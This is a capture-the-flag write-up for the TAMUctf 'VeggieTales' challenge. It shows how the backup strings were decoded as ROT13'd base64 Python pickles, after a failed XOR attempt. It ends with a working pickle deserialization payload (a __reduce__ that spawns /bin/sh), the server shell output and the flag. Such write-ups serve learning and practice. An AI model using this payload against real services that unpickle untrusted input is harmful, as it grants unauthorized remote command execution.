# VeggieTales
Pwn

## Challenge 

	It's my favorite show to watch while practicing my python skills! I've seen episode 5 at least 13 times.

	nc pwn.tamuctf.com 8448

	Difficulty: easy-medium

	2.23 1:58 pm CST: Added hint to description

## Solution

#### Program Operation

We are given 4 choices

	1. Add an episode to your watched list
	2. Print your watch list
	3. Backup your watch list
	4. Load your watch list

And we can add many episodes

	1.  Wheres God When Im S-Scared?
	2.  God Wants Me to Forgive Them!?!
	3.  Are You My Neighbor?
	4.  Rack, Shack and Benny
	5.  Dave and the Giant Pickle
	6.  The Toy That Saved Christmas
	7.  Larry-Boy! And the Fib from Outer Space!
	...
	45. Celery Night Fever
	46. Beauty and the Beet
	47. Noahs Ark
	Enter an episode (by number) to add to your watched list: 5

After which we can print

	----------------------
	List of watched episodes:
	5.  Dave and the Giant Pickle
	----------------------

Backup
	
	Episode list backup string (Don't lose it!): tNAqpDOLUDNNNQHhVPORLKMyVTShMPO0nTHtE2yuoaDtHTywn2kypDSuYt==

And load it again 

	Load your backed up list here: tNAqpDOLUDNNNQHhVPORLKMyVTShMPO0nTHtE2yuoaDtHTywn2kypDSuYt==
	Loaded backup

	Load your backed up list here: hello
	Invalid backup

---

#### Python Pickle

Since it says that a hint is added to episode 5. Perhaps it has something to do [with Python and Pickles](https://blog.nelhage.com/2011/03/exploiting-pickle/).

	5.  Dave and the Giant Pickle

To confirm, let's backup immediately upon loading the program. This probably refers to an empty list

	Episode list backup string (Don't lose it!): tNAqpDNh


To simplify my life, I made a helper script to encode/decode.

> [helper.py](helper.py)

Encoding a empty array...

	>>> encode([])
	b'gANdcQAu'

I realised the server and my self encoded do not match

	$ echo tNAqpDNh | base64 -D | xxd # server
	00000000: b4d0 2aa4 3361                           ..*.3a
	$ echo gANdcQAu | base64 -D | xxd # self
	00000000: 8003 5d71 002e                           ..]q..

---

#### Could it be XOR? (TLDR; not working)

I initially though it was XOR cipher and tried out....

**Backup empty array**

	server = 'tNAqpDNh'
	self   = encode([])
	self   = 'gANdcQAu'
	>>> bxor(base64.b64decode(self), base64.b64decode(server)).hex()
	'34d377d5334f'


**Backup `9.  Madame Blueberry`**


	# Episode list backup string (Don't lose it!):
	# tNAqpDOLSNNNNQxhVPOALJEuoJHtDzk1MJWypaW5pDSuYt==

	server = 'tNAqpDOLSNNNNQxhVPOALJEuoJHtDzk1MJWypaW5pDSuYt=='
	# self   = encode(['9.  Madame Blueberry'])
	self   = 'gANdcQBYFAAAADkuICBNYWRhbWUgQmx1ZWJlcnJ5cQFhLg=='
	>>> bxor(base64.b64decode(server), base64.b64decode(self)).hex()
	'34d377d533d35cd34d35354f74d3cd4df54fcdf4cd4d554055f7d7d7d7c0d535cf4c'

**Backup `9.  Madame Blueberry` and `28. Tomato Sawyer and Huckleberry Larrys Big River Rescue`**

	server = 'tNAqpDNbJODNNNN5YvNtGJSxLJ1yVRWfqJIvMKWlrKROJQxNNNNlBP4tIT9gLKEiVSAuq3yypvOuozDtFUIwn2kyLzIlpaxtGTSlpaymVRWcMlOFnKMypvOFMKAwqJIkNzHh'
	self   = encode(['9.  Madame Blueberry', '28. Tomato Sawyer and Huckleberry Larrys Big River Rescue'])
	>>> bxor(base64.b64decode(server), base64.b64decode(self)).hex()
	'34d377d533737cf4cd34d3404cd34d55f5d54df0177557f3ddf74d55d7d7d5d54f7d354d34d3573cd00d75500d4dd54d75734fdc05d7d4d3cfcd54cd5d3753f405574d5757d7d54d5555d7d7d5d57557f55573d7f5d557d4d3d755d353ddf7553554cf'

It seemed to match so I tried using it as a key.

	def make_backup_string(obj):
		string = pickle.dumps(obj)
		key = bytes.fromhex('34d377d533737cf4cd34d3404cd34d55f5d54df0177557f3ddf74d55d7d7d5d54f7d354d34d3573cd00d75500d4dd54d75734fdc05d7d4d3cfcd54cd5d3753f405574d5757d7d54d5555d7d7d5d57557f55573d7f5d557d4d3d755d353ddf7553554cf')
		encoded = bxor(string, key)
		return base64.b64encode(encoded)

	>>> make_backup_string(['9.  Madame Blueberry', '28. Tomato Sawyer and Huckleberry Larrys Big River Rescue'])
	b'tNAqpDNbJODNNNN5YvNtGJSxLJ1yVRWfqJIvMKWlrKROJQxNNNNlBP4tIT9gLKEiVSAuq3yypvOuozDtFUIwn2kyLzIlpaxtGTSlpaymVRWcMlOFnKMypvOFMKAwqJIkNzHh'

	>>> make_backup_string(['aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaau'])
	>>> make_backup_string(['aaaabaaacaaadaaaeaaa', 'gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaau'])
	>>> make_backup_string(['9.  0123456789ABCDEF', '28. Tomato Sawyer and Huckleberry Larrys Big River Rescue'])

But no matter what I tried, it does not accept it.

	Load your backed up list here: tNAqpDMrLfTNNLIhLbIvNJS0LpF2FDOSvJYoNLa2s7QuHFIsVbI/XbFsHDFsLL8sFBIkvWS2uLKurDmsPFY9lWQ2IjY2tqUsNDSmtrS0BzaUNAC2lLQjtbK2IKJSvNk=
	Invalid backup

### ROT13 Cipher?

Soon after, I noticed something. There is a 1-1 mapping between the letters!


	server = 'tNAqpDNh'
	self   = 'gANdcQAu'

	server = 'tNAqpDOLSNNNNQxhVPOALJEuoJHtDzk1MJWypaW5pDSuYt=='
	self   = 'gANdcQBYFAAAADkuICBNYWRhbWUgQmx1ZWJlcnJ5cQFhLg=='

On close inspection and testing, it is ROT13.

So let's update our function helper

	def make_backup_string(obj):
		string = pickle.dumps(obj)
		encoded = base64.b64encode(string).decode()
		return codecs.encode(encoded, "rot-13") 

And try out on server

	>>> make_backup_string(['Hello World'])
	'tNAqpDOLPjNNNRuyoTkiVSqipzkxpDSuYt=='

And it works!!!

	Load your backed up list here: tNAqpDOLPjNNNRuyoTkiVSqipzkxpDSuYt==
	Loaded backup

	1. Add an episode to your watched list
	2. Print your watch list
	3. Backup your watch list
	4. Load your watch list
	2
	----------------------
	List of watched episodes:
	Hello World

### The Exploit

Now that we are able to send a Pickle, let's get a shell.

> Reference: https://blog.nelhage.com/2011/03/exploiting-pickle/

	class RunBinSh(object):
		def __reduce__(self):
			return (subprocess.Popen, (('/bin/sh',),))

	>>> make_backup_string(RunBinSh())
	'tNAwp3IvpUWiL2ImpjcDo3OyotckNStUNNNNY2Wcov9mnUROuKRPuKRQHaRRYt=='

Run on server

	Load your backed up list here: tNAwp3IvpUWiL2ImpjcDo3OyotckNStUNNNNY2Wcov9mnUROuKRPuKRQHaRRYt==
	Loaded backup

	1. Add an episode to your watched list
	2. Print your watch list
	3. Backup your watch list
	4. Load your watch list
	2
	/bin/sh: 1: 2: not found
	ls
		flag.txt
		server.py
	cat flag.txt
		gigem{d0nt_7rust_th3_g1ant_pick1e}

## Flag

	gigem{d0nt_7rust_th3_g1ant_pick1e}
